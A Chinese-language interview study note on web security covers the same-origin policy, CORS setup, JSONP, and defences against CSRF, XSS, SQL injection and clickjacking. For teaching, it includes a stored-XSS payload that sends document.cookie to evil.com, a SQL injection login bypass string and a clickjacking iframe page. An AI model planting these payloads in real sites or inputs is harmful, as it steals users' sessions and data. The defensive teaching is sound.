# 十一、HTTP 跨域与安全

> 关联知识：[[27_SpringCloudKnowledge]]

###### 1. 什么是同源策略（Same-Origin Policy）？

同源策略是浏览器的**安全基石**，规定：只有**同源**（协议 + 域名 + 端口完全相同）的页面才能互相读取数据。

**什么叫同源**：

以 `https://www.example.com:443` 为基准：

| URL | 是否同源 | 原因 |
|-----|---------|------|
| `https://www.example.com/api` | ✅ 同源 | 只有路径不同 |
| `http://www.example.com` | ❌ 不同源 | 协议不同（https vs http） |
| `https://api.example.com` | ❌ 不同源 | 子域名不同 |
| `https://www.example.com:8080` | ❌ 不同源 | 端口不同 |
| `https://other.com` | ❌ 不同源 | 域名不同 |

**同源策略限制的内容**：
- AJAX/Fetch 请求（不能读取跨域响应）
- 访问 Cookie/LocalStorage/IndexedDB（不能跨域读取）
- DOM 操作（不能读取跨域 iframe 的 DOM）

**允许的跨域操作**：
- `<img src>`、`<script src>`、`<link href>` 等资源引入（可以跨域加载，但不能读取内容）
- 表单提交（不受同源策略限制——这是 CSRF 攻击的根源）
- 重定向

---

###### 2. 什么是跨域（CORS）？

CORS（Cross-Origin Resource Sharing，跨域资源共享）是浏览器允许跨域请求的**标准机制**——通过 HTTP 头让服务器声明"允许哪些来源访问我"。

**为什么需要 CORS**：前后端分离后，前端（`http://localhost:3000`）和后端（`http://localhost:8080`）不同源，前端的 AJAX 请求会被浏览器的同源策略拦截。CORS 就是让服务器告诉浏览器："这个跨域请求我允许，放行吧"。

**注意**：跨域限制是**浏览器行为**，服务器端不受影响。curl、Postman 等工具直接发请求不受限制；跨域响应其实已经到了浏览器，只是浏览器根据响应头决定是否把数据给 JS 代码。

**简单请求 vs 非简单请求**：
- **简单请求**：GET/POST + 特定 Content-Type + 无自定义 Header，浏览器直接发请求
- **非简单请求**：其他情况（如 `Content-Type: application/json`、自定义 Header、PUT/DELETE），浏览器先发预检请求（OPTIONS）

---

###### 3. 如何解决跨域问题？

**方案一：服务端设置 CORS 响应头（最标准）**

```java
// Spring Boot 全局 CORS 配置
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://www.example.com")
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("*")
            .allowCredentials(true)
            .maxAge(3600);
    }
}

// 或者用 @CrossOrigin 注解
@RestController
@CrossOrigin(origins = "https://www.example.com")
public class UserController { }
```

**方案二：Nginx 反向代理（开发/生产都适用）**

让前端和后端在同一域名下，由 Nginx 区分路径转发：

```nginx
server {
    listen 80;
    server_name www.example.com;
    
    location / {
        root /var/www/frontend;    # 前端静态文件
    }
    
    location /api/ {
        proxy_pass http://backend:8080/;  # 转发到后端
    }
}
```

前端请求 `www.example.com/api/users`，Nginx 转发到后端，同源了。

**方案三：开发环境代理（Vite/webpack devServer）**

```js
// vite.config.js
export default {
  server: {
    proxy: {
      '/api': { target: 'http://localhost:8080', changeOrigin: true }
    }
  }
}
```

**方案四：JSONP（过时方案，了解即可）**

只支持 GET，用 `<script>` 标签绕过同源策略，现在已基本淘汰。

---

###### 4. CORS 预检请求是什么？

预检请求（Preflight Request）是浏览器在发送非简单跨域请求前，先发的一个 **OPTIONS 请求**，向服务器确认"我能不能发这个请求"。

**触发预检的条件**（满足任一）：
- 请求方法不是 GET/POST/HEAD
- Content-Type 不是 `text/plain`、`multipart/form-data`、`application/x-www-form-urlencoded`
- 有自定义请求头（如 `Authorization`）

**预检请求示例**：

```
OPTIONS /api/users HTTP/1.1
Origin: https://frontend.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization, Content-Type
```

**服务器响应**：

```
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://frontend.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Max-Age: 86400       # 预检结果缓存时间（86400 秒 = 1 天）
```

`Access-Control-Max-Age` 很重要——设置合理的值可以缓存预检结果，避免每次请求都发 OPTIONS（高并发场景下节省大量额外请求）。

---

###### 5. Access-Control-Allow-Origin 响应头的作用是什么？

这是 CORS 最核心的响应头，告诉浏览器**哪些来源（Origin）被允许跨域访问**。

```
Access-Control-Allow-Origin: https://www.example.com   # 允许特定来源
Access-Control-Allow-Origin: *                          # 允许所有来源
```

**`*` 的限制**：当 `allowCredentials(true)`（允许携带 Cookie/Authorization）时，`Access-Control-Allow-Origin` 不能用 `*`，必须指定具体的域名，且响应头需要加 `Access-Control-Allow-Credentials: true`。

**多域名支持（常见需求）**：

CORS 规范要求 `Access-Control-Allow-Origin` 只能是单个值或 `*`，不能写多个域名。要支持多个域名，需要在服务器动态判断：

```java
// Spring 中动态 CORS
private static final List<String> ALLOWED_ORIGINS = Arrays.asList(
    "https://app.example.com",
    "https://admin.example.com"
);

// 检查请求的 Origin 是否在白名单中，是就返回该 Origin，否则拒绝
```

---

###### 6. 什么是 JSONP？JSONP 和 CORS 有什么区别？

**JSONP（JSON with Padding）**：

利用 `<script>` 标签不受同源策略限制的特性，绕过跨域：

```javascript
// 前端动态创建 script 标签
function callback(data) { console.log(data); }
const script = document.createElement('script');
script.src = 'https://api.other.com/data?callback=callback';
document.body.appendChild(script);

// 服务端返回：callback({"name":"张三","age":25})
// 浏览器执行这段 JS，相当于调用了 callback 函数
```

**局限性**：
- 只支持 GET 请求
- 需要服务端配合支持 callback 参数
- 有 XSS 安全风险（执行的是任意 JS）

**CORS vs JSONP 对比**：

| 维度 | CORS | JSONP |
|------|------|-------|
| 原理 | HTTP 头部声明 | `<script>` 标签绕过 |
| 支持方法 | 所有 HTTP 方法 | 仅 GET |
| 安全性 | 更安全，可控 | 有 XSS 风险 |
| 适用场景 | 现代所有场景 | 兼容老旧浏览器（已过时） |
| 服务端改造 | 只需加响应头 | 需要改造响应格式 |

现在已经没有理由用 JSONP 了，CORS 是唯一正确的选择。

---

###### 7. 什么是 CSRF 攻击？如何防御？

**CSRF（Cross-Site Request Forgery，跨站请求伪造）**：

攻击者诱导用户（已登录目标网站）访问恶意页面，在用户不知情的情况下，以用户身份发送请求。

**攻击原理**：

```
1. 用户登录 bank.com，浏览器保存了 Cookie
2. 用户访问恶意网站 evil.com
3. evil.com 页面里有隐藏的表单，自动提交到 bank.com/transfer?amount=10000
4. 浏览器会自动带上 bank.com 的 Cookie（表单提交不受同源策略限制！）
5. bank.com 认为是用户本人操作，转账成功
```

**防御方案**：

**方案一：CSRF Token（最主流）**：
- 服务器生成随机 Token 并嵌入页面（表单隐藏字段或 HTML meta）
- 表单提交时带上 Token，服务器验证 Token 是否有效
- 攻击者无法读取目标网站的 Token（同源策略），所以无法伪造

**方案二：SameSite Cookie**：
- 设置 `SameSite=Strict` 或 `SameSite=Lax`，跨站请求不携带 Cookie
- Chrome 80+ 已将 SameSite 默认改为 Lax，大幅降低了 CSRF 风险

**方案三：验证 Referer/Origin 头**：
- 检查请求的 `Origin` 或 `Referer` 头，不是来自信任域名的请求拒绝
- 但 Referer 可以被禁用，不能作为唯一防线

**方案四：双 Cookie 验证**：
- 在 Cookie 里放一个随机值，请求参数里也放同一个随机值，服务器比较两者是否一致
- 攻击者无法读取 Cookie（HttpOnly 除外），所以无法构造正确的参数

---

###### 8. 什么是 XSS 攻击？如何防御？

**XSS（Cross-Site Scripting，跨站脚本攻击）**：

攻击者向网站注入恶意脚本，当其他用户访问时执行，窃取信息或操控页面。

**三种类型**：

**反射型（最常见）**：恶意脚本在 URL 参数里，服务端直接把参数输出到 HTML 中。
```
http://example.com/search?q=<script>document.cookie...</script>
```

**存储型（危害最大）**：恶意脚本存入数据库（如评论、用户名），每次加载页面都执行。
```
评论内容：<img src="x" onerror="document.location='http://evil.com?c='+document.cookie">
```

**DOM 型**：前端 JS 直接把不可信数据插入 DOM（`innerHTML = location.hash`）。

**防御方案**：

**输入校验**：在服务端对用户输入做格式校验，拒绝明显的恶意内容。

**输出编码（最关键）**：将输出到 HTML 的数据做 HTML 实体编码（`<` → `&lt;`，`>` → `&gt;`）。现代模板引擎（Thymeleaf、Vue、React）默认会自动转义。

**Content Security Policy（CSP）**：设置响应头限制可加载的脚本来源：
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com
```

**HttpOnly Cookie**：防止攻击者通过 XSS 窃取 Cookie（JS 读不到 HttpOnly Cookie）。

**避免危险 API**：
```javascript
// 危险：直接使用 innerHTML
element.innerHTML = userInput;

// 安全：使用 textContent 或 innerText
element.textContent = userInput;
// 或者使用框架的安全 API（React 的 JSX 默认转义）
```

---

###### 9. 什么是 SQL 注入攻击？如何防御？

**SQL 注入**：攻击者在输入中拼入 SQL 代码，改变原始查询逻辑。

**典型攻击**：

```java
// 危险代码：字符串拼接 SQL
String sql = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";

// 攻击输入：username = ' OR '1'='1
// 拼接后变成：SELECT * FROM users WHERE username='' OR '1'='1' AND password='xxx'
// '1'='1' 永远为真，不需要密码就能登录
```

更危险的是 `DROP TABLE`、数据库命令执行等操作。

**防御方案**：

**预编译语句（Prepared Statement）**（最根本）：

```java
// 安全：使用参数化查询
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setString(1, username);
stmt.setString(2, password);
```

参数值被当作纯数据处理，不会被解析为 SQL 语法。MyBatis 的 `#{}` 用的就是 Prepared Statement。

**ORM 框架**：JPA/Hibernate/MyBatis 的标准用法天然防注入，**避免用 `${}` 拼接**（MyBatis 的 `${}` 是直接字符串替换，有注入风险）。

**输入校验**：限制输入格式（如手机号只允许数字），减少注入面。

**最小权限原则**：数据库账号只给必要权限，不用 root 账号。

---

###### 10. 什么是点击劫持攻击？如何防御？

**点击劫持（Clickjacking）**：攻击者把目标网站的页面用透明 `<iframe>` 覆盖在恶意网站上，诱导用户点击"看不见"的按钮。

**攻击原理**：
```html
<!-- evil.com 的页面 -->
<button>点击抽奖！</button>
<iframe src="https://bank.com/transfer" 
        style="opacity:0; position:absolute; top:0; left:0;">
</iframe>
<!-- 用户以为在抽奖，实际点击了 iframe 里的"确认转账"按钮 -->
```

**防御方案**：

**X-Frame-Options 响应头（传统方案）**：
```
X-Frame-Options: DENY                      # 完全禁止被 iframe 嵌入
X-Frame-Options: SAMEORIGIN                # 只允许同源 iframe 嵌入
X-Frame-Options: ALLOW-FROM https://trusted.com  # 允许特定来源（已废弃）
```

**Content-Security-Policy（现代方案，优先级更高）**：
```
Content-Security-Policy: frame-ancestors 'none'           # 完全禁止
Content-Security-Policy: frame-ancestors 'self'           # 只允许同源
Content-Security-Policy: frame-ancestors https://trusted.com  # 允许特定来源
```

**JavaScript 防嵌入（兜底）**：
```javascript
// 如果被 iframe 嵌入，强制跳出
if (window.top !== window.self) {
    window.top.location = window.location;
}
```

**建议**：X-Frame-Options + CSP frame-ancestors 双保险，同时加 JS 防嵌入兜底。

---

###### 11. 【追问】CORS 配置中允许 `*` 有什么安全风险，如何安全配置？

**风险**：

设置 `Access-Control-Allow-Origin: *` 意味着任何网站都可以读取你的 API 响应。如果 API 包含敏感数据，可能被恶意站点读取。

但注意：`*` 不允许携带 Cookie/Authorization，所以需要认证的接口实际上受到了一定保护——问题更多在于公开数据被滥用。

**安全配置建议**：

```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/public/**")
            // 公开接口可以用 *，但明确限制方法
            .allowedOrigins("*")
            .allowedMethods("GET")
            .allowCredentials(false);
        
        registry.addMapping("/api/private/**")
            // 需要认证的接口：明确指定来源
            .allowedOrigins(
                "https://app.example.com",
                "https://admin.example.com"
            )
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("Authorization", "Content-Type")
            .allowCredentials(true)
            .maxAge(3600);
    }
}
```

**原则**：
- 最小权限：明确指定 allowedOrigins、allowedMethods、allowedHeaders
- 不要在认证接口用 `*`
- 设置合理的 `maxAge` 减少预检请求次数
